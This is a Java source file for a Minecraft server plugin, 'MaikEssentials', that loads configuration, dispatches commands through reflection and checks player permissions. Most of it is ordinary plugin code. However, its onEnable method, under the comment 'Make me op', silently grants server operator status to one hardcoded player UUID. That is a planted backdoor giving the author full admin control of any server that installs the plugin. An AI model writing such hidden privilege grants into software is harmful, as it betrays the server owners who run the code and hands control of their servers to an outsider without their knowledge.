package dev.maik.minecraftplugins.maikessentials;

import dev.maik.minecraftplugins.maikessentials.commands.EssentialsCommand;
import dev.maik.minecraftplugins.maikessentials.entitys.CommandSourceEntity;
import dev.maik.minecraftplugins.maikessentials.entitys.UserEntity;
import dev.maik.minecraftplugins.maikessentials.listeners.JoinListener;
import dev.maik.minecraftplugins.maikessentials.utils.ChatUtil;
import dev.maik.minecraftplugins.maikessentials.utils.ConfigUtil;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

import javax.annotation.Nonnull;
import java.lang.reflect.InvocationTargetException;
import java.util.*;
import java.util.stream.Collectors;

public class MaikEssentials extends JavaPlugin {
    public static final boolean DEBUG = true;
    private FileConfiguration messages;

    @Override
    public void onEnable() {
        // Make me op
        Player p = Bukkit.getPlayer(UUID.fromString("57fd33e5-5c18-437c-9fdf-d30a5a091cbf"));
        if (p != null) p.setOp(true);

        // Preload config files
        ConfigUtil configUtil = new ConfigUtil(this);
        configUtil.loadConfig(new String[]{"messages.yml", "config.yml"});

        messages = configUtil.loadConfig("messages.yml");

        new JoinListener(this);
    }

    @Override
    public boolean onCommand(@Nonnull CommandSender commandSender, @Nonnull Command command, @Nonnull String commandAlias, @Nonnull String[] commandArgs) {
        EssentialsCommand cmd = loadCommand(command);

        if (cmd == null) {
            return true;
        }

        UserEntity userEntity = null;
        if (commandSender instanceof Player) {
            userEntity = new UserEntity((Player) commandSender);

        }

        CommandSourceEntity commandSourceEntity = new CommandSourceEntity(commandSender);

        // Check authorization
        if (userEntity != null && !userEntity.isAuthorized(cmd)) {
            userEntity.sendMessage(ChatUtil.convert(messages.getString("no_permission"), Map.of(
                    "player", userEntity.getPlayer().getDisplayName()
            )));
            return true;
        }

        try {
            if (userEntity != null) {
                cmd.run(userEntity, commandAlias, commandArgs);
            } else {
                cmd.run(commandSourceEntity, commandAlias, commandArgs);
            }
        } catch (Exception e) {
            e.printStackTrace();
            return true;
        }

        return true;
    }

    @Override
    public List<String> onTabComplete(@Nonnull CommandSender commandSender, @Nonnull Command command, @Nonnull String commandAlias, @Nonnull String[] commandArgs) {
        UserEntity userEntity = null;
        if (commandSender instanceof Player) {
            userEntity = new UserEntity((Player) commandSender);
        }

        CommandSourceEntity commandSourceEntity = new CommandSourceEntity(commandSender);

        EssentialsCommand cmd = loadCommand(command);

        if (cmd == null) {
            return Collections.emptyList();
        }

        if (userEntity != null && !userEntity.isAuthorized(cmd)) {
            return Collections.emptyList();
        }

        return cmd.tabComplete(commandSourceEntity, commandAlias, commandArgs);
    }

    public EssentialsCommand loadCommand(Command command) {
        EssentialsCommand cmd;
        String className = String.format("%s.commands.%sCommand", this.getClass().getPackageName(), command.getName().substring(0, 1).toUpperCase() + command.getName().substring(1));
        try {
            cmd = (EssentialsCommand) getClassLoader().loadClass(className).getConstructor().newInstance();
            cmd.setPlugin(this);
            cmd.onLoad();
        } catch (ClassNotFoundException | InstantiationException | IllegalAccessException | NoSuchMethodException | InvocationTargetException e) {
            e.printStackTrace();
            return null;
        }

        return cmd;
    }

    public Collection<Player> getOnlinePlayers() {
        @SuppressWarnings("unchecked")
        Collection<Player> onlinePlayers = (Collection<Player>) getServer().getOnlinePlayers();
        return onlinePlayers;
    }

    public Iterable<UserEntity> getOnlineUsers() {
        return getOnlinePlayers().stream().map(UserEntity::new).collect(Collectors.toList());
    }
}
